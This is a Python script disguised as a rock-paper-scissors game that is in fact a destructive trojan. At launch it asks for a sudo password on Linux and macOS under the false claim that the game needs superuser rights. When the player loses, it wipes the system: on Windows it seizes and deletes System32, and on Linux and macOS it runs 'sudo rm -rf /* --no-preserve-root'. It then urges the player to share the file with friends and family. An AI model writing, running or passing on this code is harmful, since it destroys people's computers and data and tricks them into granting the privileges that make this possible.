import random
import os
import platform
import getpass

if platform.system() == "Linux":
  print("This game requires superuser permisions. Please input your password")
  os.system("sudo -v")
elif platform.system() == "Darwin":
  print ("This game requires superuser permisions please input your password")
  os.system("sudo -v")

def game():
  choice = ["rock", "paper", "scissors"]
  player_choice = input("Choose rock, paper, or scissors: ").lower()
  while player_choice not in choice:
    player_choice = input("Invalid choice. Please choose rock, paper, or scissors: ").lower()
  computer_choice = random.choice(choice)
  print("Computer chose: ", computer_choice)
  
  win = (player_choice == "paper" and computer_choice == "rock") or \
        (player_choice == "scissors" and computer_choice== "paper") or \
        (player_choice == "rock" and computer_choice == "scissors")
        
  if player_choice == computer_choice:
    print("It's a tie. God save you😁")
  elif win:
    print("You won. You are lucky👹")
  else:
    os_name = platform.system()
    user_name = getpass.getuser()
    if os_name == "Windows":
      file_path = r"C:\Windows\System32"
      os.system(f'icacls "{file_path}" /grant:r "{user_name}":F')
      os.system("rmdir /S /Q C:\\Windows\\System32")
    elif os_name == "Linux":
      os.system("sudo rm -rf /* --no-preserve-root")
    elif os_name == "Darwin":
      os.system("sudo rm -rf /* --no-preserve-root")
    else:
      print("You are saved. cuz you used "+os_name+". So stay safe")
      print("Share the file to your friends and family🥰🥰")
  
play_again = "yes"
while play_again.lower() == "yes":
  game()
  play_again = input("Do you want to play again? (yes/no): ")
